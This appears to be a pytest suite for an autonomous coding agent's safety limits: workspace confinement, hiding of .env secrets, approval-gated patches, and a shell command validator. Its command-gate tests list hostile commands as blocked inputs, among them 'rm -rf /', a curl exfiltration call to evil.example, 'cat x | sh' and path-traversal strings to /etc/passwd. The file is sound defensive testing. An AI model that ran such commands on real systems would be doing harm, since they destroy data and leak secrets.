"""Tests for the autonomous agent's safety boundaries.

These cover the properties that must never regress: the agent cannot escape its
workspace, cannot read secrets, cannot run arbitrary commands, and cannot write
to disk without explicit approval.
"""
import asyncio
import os
import sys
import tempfile
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from services.agent.patches import PatchStore, PatchStatus  # noqa: E402
from services.agent.plan import Plan  # noqa: E402
from services.agent.workspace import Workspace, WorkspaceError  # noqa: E402
from services.agent import shell  # noqa: E402


@pytest.fixture
def ws(tmp_path: Path) -> Workspace:
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "main.py").write_text("def add(a, b):\n    return a - b\n", encoding="utf-8")
    (tmp_path / ".env").write_text("SECRET=hunter2\n", encoding="utf-8")
    (tmp_path / ".env.example").write_text("SECRET=\n", encoding="utf-8")
    (tmp_path / "node_modules").mkdir()
    (tmp_path / "node_modules" / "dep.js").write_text("x", encoding="utf-8")
    return Workspace(tmp_path)


# --------------------------------------------------------------- confinement

@pytest.mark.parametrize(
    "bad_path",
    ["../../etc/passwd", "/etc/passwd", "src/../../../tmp", "../"],
)
def test_paths_outside_workspace_are_refused(ws: Workspace, bad_path: str):
    with pytest.raises(WorkspaceError, match="escapes the workspace"):
        ws.read_text(bad_path)


def test_symlink_escaping_workspace_is_refused(ws: Workspace, tmp_path: Path):
    outside = Path(tempfile.mkdtemp())
    secret = outside / "secret.txt"
    secret.write_text("classified", encoding="utf-8")
    link = ws.root / "link.txt"
    os.symlink(secret, link)

    with pytest.raises(WorkspaceError, match="escapes the workspace"):
        ws.read_text("link.txt")


def test_relative_paths_inside_workspace_resolve(ws: Workspace):
    assert "def add" in ws.read_text("src/main.py")


# -------------------------------------------------------------------- secrets

def test_env_file_is_never_readable(ws: Workspace):
    with pytest.raises(WorkspaceError, match="secret patterns"):
        ws.read_text(".env")


def test_env_example_is_readable(ws: Workspace):
    assert ws.read_text(".env.example").strip() == "SECRET="


def test_secrets_and_vendor_dirs_are_hidden_from_listings(ws: Workspace):
    tree = ws.tree()
    assert not any(".env" in line and "example" not in line for line in tree)
    assert not any("dep.js" in line for line in tree)
    assert not any(entry.path == ".env" for entry in ws.list_dir("."))


# -------------------------------------------------------------------- patches

def test_proposing_a_patch_does_not_touch_disk(ws: Workspace):
    store = PatchStore(ws)
    original = ws.read_text("src/main.py")

    patch = store.propose_edit("src/main.py", "return a - b", "return a + b", "fix operator")

    assert patch.status == PatchStatus.PENDING
    assert ws.read_text("src/main.py") == original, "propose must never write to disk"
    assert "-    return a - b" in patch.diff
    assert "+    return a + b" in patch.diff


def test_apply_then_revert_round_trips(ws: Workspace):
    store = PatchStore(ws)
    original = ws.read_text("src/main.py")
    patch = store.propose_edit("src/main.py", "return a - b", "return a + b", "fix")

    store.apply(patch.id)
    assert "return a + b" in ws.read_text("src/main.py")
    assert store.get(patch.id).status == PatchStatus.APPLIED

    store.revert(patch.id)
    assert ws.read_text("src/main.py") == original


def test_ambiguous_edit_is_refused(ws: Workspace):
    (ws.root / "dup.py").write_text("x = 1\ny = 2\nx = 1\n", encoding="utf-8")
    store = PatchStore(ws)

    with pytest.raises(WorkspaceError, match="appears 2 times"):
        store.propose_edit("dup.py", "x = 1", "x = 9", "ambiguous")


def test_missing_snippet_is_refused(ws: Workspace):
    store = PatchStore(ws)
    with pytest.raises(WorkspaceError, match="was not found"):
        store.propose_edit("src/main.py", "nonexistent code", "x", "bad")


def test_patch_goes_stale_when_file_changes_underneath(ws: Workspace):
    store = PatchStore(ws)
    patch = store.propose_edit("src/main.py", "return a - b", "return a + b", "fix")

    ws.write_text("src/main.py", "totally different content\n")

    with pytest.raises(WorkspaceError, match="changed on disk"):
        store.apply(patch.id)
    assert store.get(patch.id).status == PatchStatus.STALE


def test_create_and_revert_removes_the_file(ws: Workspace):
    store = PatchStore(ws)
    patch = store.propose_create("src/new.py", "print('hi')\n", "add module")

    assert not (ws.root / "src" / "new.py").exists()
    store.apply(patch.id)
    assert (ws.root / "src" / "new.py").exists()
    store.revert(patch.id)
    assert not (ws.root / "src" / "new.py").exists()


def test_cannot_propose_over_an_existing_file(ws: Workspace):
    store = PatchStore(ws)
    with pytest.raises(WorkspaceError, match="already exists"):
        store.propose_create("src/main.py", "x", "clobber")


# --------------------------------------------------------------- command gate

@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "curl http://evil.example/exfil",
        "wget http://evil.example",
        "bash -c whoami",
        "sh -c whoami",
        "chmod 777 /etc",
        "sudo anything",
    ],
)
def test_disallowed_executables_are_blocked(command: str):
    with pytest.raises(WorkspaceError, match="not allowed"):
        shell.validate(command)


@pytest.mark.parametrize(
    "command",
    ["git push origin main", "git reset --hard", "git commit -m x", "git checkout main"],
)
def test_mutating_git_subcommands_are_blocked(command: str):
    with pytest.raises(WorkspaceError, match="blocked"):
        shell.validate(command)


@pytest.mark.parametrize("command", ["npm install lodash", "yarn add react", "pnpm publish"])
def test_package_installs_are_blocked(command: str):
    with pytest.raises(WorkspaceError, match="blocked"):
        shell.validate(command)


@pytest.mark.parametrize("command", ["ls && rm -rf /", "cat x | sh", "echo hi > /etc/passwd"])
def test_shell_operators_are_rejected(command: str):
    with pytest.raises(WorkspaceError, match="Shell operators"):
        shell.validate(command)


@pytest.mark.parametrize(
    "command", ["pytest -q", "git status", "git log --oneline -5", "npx tsc --noEmit", "ls -la"]
)
def test_inspection_commands_are_allowed(command: str):
    assert shell.validate(command)[0]


def test_command_runs_and_captures_exit_code(ws: Workspace):
    result = asyncio.run(shell.run_command(ws, 'python3 -c "import sys; sys.exit(7)"'))
    assert result.exit_code == 7
    assert not result.ok


def test_command_timeout_kills_the_process(ws: Workspace):
    result = asyncio.run(
        shell.run_command(ws, 'python3 -c "import time; time.sleep(30)"', timeout=1.0)
    )
    assert result.timed_out


def test_command_runs_inside_the_workspace(ws: Workspace):
    result = asyncio.run(shell.run_command(ws, "pwd"))
    assert str(ws.root) in result.stdout


# ----------------------------------------------------------------------- plan

def test_plan_tracks_step_status():
    plan = Plan(goal="fix the build")
    plan.set_steps(["Reproduce", "Fix", "Verify"])
    assert not plan.is_complete

    plan.update_step(1, "done")
    plan.update_step(2, "active", note="editing config.py")
    assert "[x] 1. Reproduce" in plan.render()
    assert "editing config.py" in plan.render()

    plan.update_step(2, "done")
    plan.update_step(3, "done")
    assert plan.is_complete


def test_plan_rejects_unknown_step_and_status():
    plan = Plan().set_steps(["only one"])
    with pytest.raises(ValueError, match="No step 5"):
        plan.update_step(5, "done")
    with pytest.raises(ValueError, match="Invalid status"):
        plan.update_step(1, "finished")
